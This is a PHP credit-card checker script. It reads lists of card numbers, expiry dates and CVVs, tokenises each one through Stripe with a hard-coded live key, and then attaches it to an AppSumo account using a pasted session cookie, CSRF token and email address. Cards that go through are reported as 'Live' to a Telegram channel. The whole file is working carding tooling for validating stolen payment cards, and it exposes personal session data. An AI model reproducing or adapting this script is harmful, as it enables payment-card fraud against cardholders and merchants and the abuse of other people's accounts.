<?php
include 'func.php';
error_reporting(0);
date_default_timezone_set('America/Buenos_Aires');

function GetStr($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

function multiexplode($seperator, $string){
    $one = str_replace($seperator, $seperator[0], $string);
    $two = explode($seperator[0], $one);
    return $two;
};

$pklive = $_GET['pklive'];
$cslive = $_GET['cslive'];
$xemail = $_GET['xemail'] ?? '';
$key_maker = basename(parse_url($cslive, PHP_URL_PATH));

function sendRequest($url, $headers, $data = null, $method = 'GET') {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    if ($method === 'POST') {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    }

    $response = curl_exec($ch);
    curl_close($ch);
    return json_decode($response, true);
}

$cards = explode("\n", trim($_GET['cards']));
$multi = curl_multi_init();
$curl_array = [];
$card_data = [];

foreach ($cards as $i => $lista) {
    $parts = multiexplode([":", "|", ""], $lista);
    if (count($parts) < 4) continue;

    [$cc, $mes, $ano, $cvv] = $parts;
    if (strlen($mes) == 1) $mes = "0$mes";
    if (strlen($ano) == 2) $ano = "20$ano";

    $tk_url = "https://api.stripe.com/v1/payment_methods";
    $tk_data = [
        "type" => "card",
        "billing_details[address][country]" => "TR",
        "card[number]" => $cc,
        "card[exp_month]" => $mes,
        "card[exp_year]" => $ano,
        "referrer" => "https://appsumo.com",
        "key" => "pk_live_MN9snrtNrVcXHm2bT6Vn2I9L"
    ];

    $tk_headers = [
        "Content-Type: application/x-www-form-urlencoded",
        "Accept: application/json",
        "User-Agent: Mozilla/5.0"
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $tk_url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($tk_data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, $tk_headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
    $curl_array[$i] = $ch;
    $card_data[$i] = [$lista, $cc, $mes, $ano, $cvv];
    curl_multi_add_handle($multi, $ch);
}

$running = null;
do {
    curl_multi_exec($multi, $running);
    curl_multi_select($multi);
} while ($running > 0);

foreach ($curl_array as $i => $ch) {
    $tk_response = curl_multi_getcontent($ch);
    $response_data = json_decode($tk_response, true);
    list($lista, $cc, $mes, $ano, $cvv) = $card_data[$i];

    if (!isset($response_data['id'])) {
        echo "<span class='text text-danger'>Decline</span> ➔ $lista ➔ Failed to create payment method.<br>";
        curl_multi_remove_handle($multi, $ch);
        curl_close($ch);
        continue;
    }

    $payment_method_id = $response_data['id'];
    $pay_url = "https://appsumo.com/account/cards/create/";
    $pay_data = ["payment_method_id" => $payment_method_id];

    $headers = [
        "Accept: */*",
        "Content-Type: multipart/form-data",
        "Origin: https://appsumo.com",
        "Referer: https://appsumo.com/account/payments/",
        "User-Agent: Mozilla/5.0",
        "X-CSRFToken: ABlBOgjoeWmAHZJfRgAGOvzla0AEHfkp",
        'Cookie: _gcl_au=1.1.506065889.1742444046; _BEAMER_USER_ID_LesHrWzC3989=dc1a9f5b-6855-4471-bbdd-53a1b559a6f3; _BEAMER_FIRST_VISIT_LesHrWzC3989=2025-03-20T04:14:05.733Z; _fbp=fb.1.1742444045942.832910869509424416; _ga=GA1.1.1341601051.1742444046; FPAU=1.1.506065889.1742444046; _dcid=dcid.1.1742444056471.492017033; __stripe_mid=c149f18b-dac9-412d-992a-2d169775118b379258; g_state={"i_l":0}; _privy_undefined=%7B%22uuid%22%3A%221e859d7c-b9e9-44a5-89fb-c9a7811fe8aa%22%7D; _privy_BB924CED6226F3A9A3091210=%7B%22uuid%22%3A%223ef55ab0-1966-4393-a331-3d6189f520f0%22%2C%22variations%22%3A%7B%7D%2C%22country_code%22%3A%22PH%22%2C%22region_code%22%3A%22PH_40%22%2C%22postal_code%22%3A%224217%22%7D; _gtmeec=eyJlbSI6IjVlZTQ5MDhkZjBhZTJiOGJiNDQ4Y2EyY2FjMjBkODhjNWM3MjUyOWNkOWMwNmViNWU5OWFmMjkyZmRjM2NlZWMiLCJleHRlcm5hbF9pZCI6IjMzMjYxMDgifQ%3D%3D; stape_klaviyo_email=christianabay57%40gmail.com; hide_privy=true; _clck=6mzhkp%7C2%7Cfvc%7C0%7C1905; _BEAMER_FILTER_BY_URL_LesHrWzC3989=false; __stripe_sid=aad013d9-2889-4af0-b434-4cf08351d9e65c1169; __experiment_currency-conversion=disabled; __experiment_coupon-discount-by-plan-tiers=disabled; __experiment_nps-survey=enabled; __experiment_radio-list-survey=enabled; FPGSID=1.1745482577.1745482709.G-EG6M2EJK3F.78c4X6cj18MxGkLbeicrYw; g_csrf_token=c3d8cca9f437af41; csrftoken=ABlBOgjoeWmAHZJfRgAGOvzla0AEHfkp; __user_state="eyJpc19hdXRoZW50aWNhdGVkIjogdHJ1ZSwgImlzX3N0YWZmIjogZmFsc2UsICJoYXNfcGx1cyI6IG51bGwsICJoYXNfYnJpZWZjYXNlIjogbnVsbCwgImlzX2JldGFsaW5nIjogZmFsc2UsICJoYXNfcGFydG5lcl9wb3J0YWwiOiBmYWxzZX0="; sid=3zck2vmlih7wg5i65ta212vt1d9212b7; last_login=2025-04-24T08:18:43.262709+00:00; _rdt_uuid=1742444046790.0ef693e8-5958-487e-ae90-c8f7dfc256b7; __appsumo_discount_banner=march-15-test__10-off; _ga_VT1JDT21CH=GS1.1.1745482577.28.1.1745482730.37.0.0; _clsk=q1lj3d%7C1745482731052%7C6%7C1%7Cl.clarity.ms%2Fcollect; __kla_id=eyJjaWQiOiJPVFl3TW1NMlptWXRNREV3WlMwME1tRXpMVGd6TWpVdFkySm1abVl4WmpJNFpqQTIiLCIkZXhjaGFuZ2VfaWQiOiJLS1dKMGtNbFdRZVlDZzd5dXhHS2d5aGgwdlpTNDdCX20tMWFxZFNZZmxoblVIeE5MYU5NRklsOFZELXVXQXRsLkt0cDRaRyJ9; _ga_EG6M2EJK3F=GS1.1.1745482577.28.1.1745482731.0.0.1962548997; AWSALB=9FRWvxJY6syVMbyebpiVWBsEUb9Y3aH5dtX2RHLHsJ7HY5b5kLpHoAlUMl8knlxs5OT9kxuzm8YSn24Tz5YxO0VgvorfTTO/1+fmF+5iAjiXJ4GphaWv/2BN+j3a; AWSALBCORS=9FRWvxJY6syVMbyebpiVWBsEUb9Y3aH5dtX2RHLHsJ7HY5b5kLpHoAlUMl8knlxs5OT9kxuzm8YSn24Tz5YxO0VgvorfTTO/1+fmF+5iAjiXJ4GphaWv/2BN+j3a'
    ];

    $ch2 = curl_init();
    curl_setopt($ch2, CURLOPT_URL, $pay_url);
    curl_setopt($ch2, CURLOPT_POST, 1);
    curl_setopt($ch2, CURLOPT_POSTFIELDS, $pay_data);
    curl_setopt($ch2, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch2, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch2, CURLOPT_TIMEOUT, 15);

    $pay_response = curl_exec($ch2);
    $http_code = curl_getinfo($ch2, CURLINFO_HTTP_CODE);
    curl_close($ch2);

    if ($http_code === 200) {
        echo "<span class='text text-success'>Live</span> ➔ $lista ➔ Payment method added. ($http_code)<br>";
        $message = "🔊<b>LIVE CARD DETECTED!</b>\n✉️ <b>CARD:</b> $lista\n🔍 <b>STATUS:</b>CCN Payment method added. ($http_code)\n🌐 <b>CREATED BY:</b> I AM ATOMIC LANG MALAKAS!";
        sendToTelegram($message,$telegram);
    } elseif ($http_code === 400) {
        echo "<span class='text text-danger'>Decline</span> ➔ $lista ➔ Cannot add payment method now. ($http_code)<br>";
    } else {
        echo "<span class='text text-warning'>Decline</span> ➔ $lista ➔ Payment method not added. ($http_code)<br>";
    }

    curl_multi_remove_handle($multi, $ch);
    curl_close($ch);
}

curl_multi_close($multi);
ob_flush();
?>
